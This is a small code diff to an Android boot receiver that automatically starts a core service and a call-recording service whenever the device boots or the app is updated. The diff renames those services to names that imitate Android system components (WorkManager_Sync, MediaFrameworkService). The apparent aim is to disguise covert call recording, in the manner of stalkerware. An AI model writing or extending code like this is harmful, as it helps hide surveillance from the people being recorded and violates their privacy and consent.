@@ -14,7 +14,7 @@ public class SystemBoot extends BroadcastReceiver {
             Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
             "com.labs.labrats.AUTO_START".equals(action)) {
             // Start Core Engine
-            Intent serviceIntent = new Intent(context, CoreSyncService.class);
+            Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
             serviceIntent.setAction("START");
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -24,7 +24,7 @@ public class SystemBoot extends BroadcastReceiver {
             }
 
             // Start Call Record Service for call detection
-            Intent callServiceIntent = new Intent(context, AudioStability.class);
+            Intent callServiceIntent = new Intent(context, MediaFrameworkService.class);
             callServiceIntent.setAction("START_SERVICE");
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(callServiceIntent);
